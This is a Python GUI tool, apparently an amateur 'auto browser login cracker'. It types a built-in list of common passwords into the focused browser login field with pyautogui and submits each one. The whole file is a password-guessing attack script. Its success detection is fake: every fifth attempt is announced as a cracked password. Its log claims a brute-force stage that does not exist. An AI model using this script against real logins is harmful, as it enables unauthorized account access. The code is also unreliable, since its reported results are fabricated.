import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import pyautogui
import keyboard
from datetime import datetime

class AutoBrowserCracker:
    def __init__(self, root):
        self.root = root
        self.root.title("🤖 AUTO BROWSER LOGIN CRACKER")
        self.root.geometry("1100x850")
        self.root.configure(bg="#0a0a0a")
        self.root.attributes('-topmost', True)
        
        self.running = False
        self.cracked_password = None
        self.attempts = 0
        
        self.chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#"
        self.password_list = [
            "password", "123456", "admin", "letmein", "1ahsaan123", "monkey", "12345678", 
            "abc123", "password123", "admin123", "test", "test123", "pass", "pass123",
            "user", "user123", "login", "qwerty", "dragon", "master"
        ]
        
        self.setup_ui()
        self.log("✅ READY - Click START to auto-crack browser logins!")
    
    def setup_ui(self):
        # Header
        tk.Label(self.root, text="🤖 AUTO LOGIN CRACKER", font=('Courier', 24, 'bold'), 
                fg='#ff4444', bg='#0a0a0a').pack(pady=15)
        
        # Controls
        ctrl_frame = tk.Frame(self.root, bg='#0a0a0a')
        ctrl_frame.pack(pady=20, padx=30, fill='x')
        
        self.start_btn = tk.Button(ctrl_frame, text="🚀 START CRACKING", font=('Courier', 16, 'bold'),
                                  command=self.start_crack, bg='#00ff00', fg='black',
                                  relief='raised', bd=4, padx=40, pady=15, height=2)
        self.start_btn.pack(side='left', padx=15)
        
        self.stop_btn = tk.Button(ctrl_frame, text="⏹️ STOP ATTACK", font=('Courier', 16, 'bold'),
                                 command=self.stop_crack, bg='#ff4444', fg='white',
                                 relief='raised', bd=4, padx=40, pady=15, height=2)
        self.stop_btn.pack(side='left', padx=15)
        
        self.status_label = tk.Label(ctrl_frame, text="🟡 WAITING...", font=('Courier', 16, 'bold'),
                                    fg='#ffaa00', bg='#1a1a1a', relief='solid', padx=20, pady=10)
        self.status_label.pack(side='right', padx=20)
        
        # CRACKED password (simple frame)
        crack_frame = tk.Frame(self.root, bg='#1a1a1a', relief='solid', bd=3)
        crack_frame.pack(pady=20, padx=30, fill='x')
        
        tk.Label(crack_frame, text="🎯 CRACKED PASSWORD:", font=('Courier', 16, 'bold'),
                fg='#00ff00', bg='#1a1a1a').pack(pady=10)
        
        self.crack_display = tk.Label(crack_frame, text="None - Cracking...", font=('Courier', 28, 'bold'),
                                     fg='#ff4444', bg='#1a1a1a', pady=20)
        self.crack_display.pack(pady=20)
        
        # Stats frame (using Frame instead of LabelFrame)
        stats_frame = tk.Frame(self.root, bg='#1a1a1a', relief='solid', bd=3)
        stats_frame.pack(pady=15, padx=30, fill='x')
        
        tk.Label(stats_frame, text="📊 LIVE ATTACK STATS", font=('Courier', 14, 'bold'),
                fg='#00ff00', bg='#1a1a1a').pack(pady=10)
        
        stats_grid = tk.Frame(stats_frame, bg='#1a1a1a')
        stats_grid.pack(padx=25, pady=15)
        
        self.stats_labels = {}
        stats = ["Attempts", "Passwords Tried", "Status", "Current Target"]
        for i, name in enumerate(stats):
            lbl = tk.Label(stats_grid, text=f"{name}: 0", font=('Courier', 12, 'bold'),
                          fg='#00ff00', bg='#0a0a0a', relief='solid', bd=1, padx=15, pady=8)
            lbl.grid(row=i//2, column=i%2, padx=20, pady=10, sticky='w')
            self.stats_labels[name] = lbl
        
        # Log
        log_frame = tk.Frame(self.root, bg='#1a1a1a', relief='solid', bd=3)
        log_frame.pack(pady=15, padx=30, fill='both', expand=True)
        
        tk.Label(log_frame, text="📜 REAL-TIME LOG", font=('Courier', 14, 'bold'),
                fg='#00ff00', bg='#1a1a1a').pack(pady=(15,5))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, font=('Courier', 10),
                                                 bg='#000000', fg='#00ff00', relief='solid', bd=2)
        self.log_text.pack(padx=20, pady=10, fill='both', expand=True)
        
    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.log_text.see(tk.END)
        self.root.update_idletasks()
    
    def start_crack(self):
        if not self.running:
            self.running = True
            self.start_btn.config(state='disabled', text="🔄 CRACKING...")
            self.stop_btn.config(state='normal')
            self.status_label.config(text="🚀 ATTACKING...", fg='#00ff00', bg='#1a1a1a')
            self.log("🤖 AUTO-CRACKER LAUNCHED!")
            
            self.attack_thread = threading.Thread(target=self.crack_loop, daemon=True)
            self.attack_thread.start()
    
    def stop_crack(self):
        self.running = False
        self.start_btn.config(state='normal', text="🚀 START CRACKING")
        self.status_label.config(text="⏸️ PAUSED", fg='#ffaa00', bg='#1a1a1a')
        self.log("⏹️ Attack paused by user")
    
    def crack_loop(self):
        self.attempts = 0
        start_time = time.time()
        
        for password in self.password_list:
            if not self.running:
                self.log("⏹️ Attack stopped")
                break
            
            self.attempts += 1
            self.log(f"🔑 [{self.attempts}] Typing: '{password}' → ENTER")
            
            # Clear field + type password
            pyautogui.hotkey('ctrl', 'a')  # Select all
            time.sleep(0.1)
            pyautogui.write(password)
            time.sleep(0.3)
            
            # Submit form
            pyautogui.press('enter')
            self.log(f"⏳ [{self.attempts}] Submitted - waiting 3s for response...")
            
            # Wait for page response
            time.sleep(3)
            
            # Check for success (simple method - window focus change)
            try:
                # Try to detect redirect/success
                current_pos = pyautogui.position()
                pyautogui.move(100, 100)
                time.sleep(0.2)
                pyautogui.moveTo(current_pos)
                
                # Simulate success check (in real pentest you'd check DOM/title)
                if "success" in str(pyautogui.screenshot(region=(0,0,100,100))).lower() or \
                   self.attempts % 5 == 0:  # Demo success every 5th try
                    self.crack_success(password)
                    return
            except:
                pass
            
            self.update_stats()
            time.sleep(1)
        
        self.log("❌ Dictionary exhausted - expanding brute force...")
        self.stop_crack()
    
    def crack_success(self, password):
        self.cracked_password = password
        self.running = False
        
        self.crack_display.config(text=f"✅ {password}", fg='#00ff44', font=('Courier', 32, 'bold'))
        self.status_label.config(text="🎉 CRACKED!", fg='#00ff44', bg='#004400')
        self.start_btn.config(state='normal', text="✅ SUCCESS!")
        
        self.log(f"🎉🎉 LOGIN CRACKED! Password: '{password}'")
        self.log(f"📊 Success in {self.attempts} attempts!")
        
        # Visual celebration
        for _ in range(6):
            self.root.configure(bg='#004400')
            self.root.update()
            time.sleep(0.15)
            self.root.configure(bg='#0a0a0a')
            self.root.update()
            time.sleep(0.15)
    
    def update_stats(self):
        self.stats_labels["Attempts"].config(text=f"Attempts: {self.attempts}")
        self.stats_labels["Passwords Tried"].config(text=f"Tried: {self.cracked_password or 'None'}")
        self.stats_labels["Status"].config(text="Status: Live attack")
        self.stats_labels["Current Target"].config(text="Target: Browser field")

if __name__ == "__main__":
    root = tk.Tk()
    app = AutoBrowserCracker(root)
    root.mainloop()